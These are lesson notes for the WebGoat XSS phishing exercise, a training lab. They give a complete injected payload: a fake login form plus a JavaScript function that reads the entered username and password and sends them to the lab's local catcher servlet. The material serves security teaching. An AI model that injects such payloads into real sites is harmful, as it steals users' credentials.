# Webgoat XSS Phishing Lesson Notes
Inject HTML and JS to phish user credentials. This attack consists of two parts that you have to combine:
* A form the victim has to fill in
* A script which reads the form and sends the gathered information to the attacker

### The Malicious HTML Form
First inject the HTML into the Search input field to create a form just below it:

```html
<form name="phish"><br><br><HR><H3>This feature requires account login:</H2><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br></form><br><br><HR>
  ```
Add a button that can POST a request:
```html
<input type="submit" name="login" value="login">
```
The HTML for the `submit` button has to go in the HTML before the closing `</form>` tag.
Also, you have to put an `onclick` handler before closing this last `input` tag.

```javascript
onclick="hack()"
```
So now the last `input` tag looks like this:

```html
<input type="submit" name="login" value="login" onclick="hack()">
```

At this point the injected HTML form looks like this:

```html
<form name="phish"><br><br><HR><H3>This feature requires account login:</H2><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>
```

### The Malicious Script
But of course this means that you have to create a Javascript function called `hack()`. This function will pull the credentials from the webpage and post them to the WebGoat catcher servlet, which is running locally.

```javascript
<script>
function hack(){
  // Instantiate a new DOM image element which will perform a post
  XSSImage=new Image;
  // Post it to the WebGoat catcher servlet (which runs automatically)
  XSSImage.src="<http://localhost:8080/WebGoat/catcher?PROPERTY=yes&user=" + \
  // Access the values of the user & pass input fields. Append to the URL.
  document.phish.user.value> + "&password=" + document.phish.pass.value + "";
  // Pop up an alert() to display the victim's username and password.
  alert("Had this been a real attack... Your credentials were just stolen. \
  User Name = " + document.phish.user.value + " Password = " + \
  document.phish.pass.value);
  }
</script>
```
### Launching the Attack
Because we're injecting a new pair of `form` tags (both `<form>` and `<form>`), we must terminate the existing Search form by prepending `</form>` at the beginning of what we're injecting.

```html
</form><script>function hack(){ XSSImage=new Image; XSSImage.src="http://localhost:8080/WebGoat/catcher?PROPERTY=yes&user=" + document.phish.user.value + "&password=" + document.phish.pass.value + "";alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + " Password = " + document.phish.pass.value);} </script><form name="phish"><br><br><HR><H3>This feature requires account login:</H2><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>
```

Yes, we are ending up with an extra `</form>` tag at the bottom of the HTML of the response page. But the browser doesn't mind.
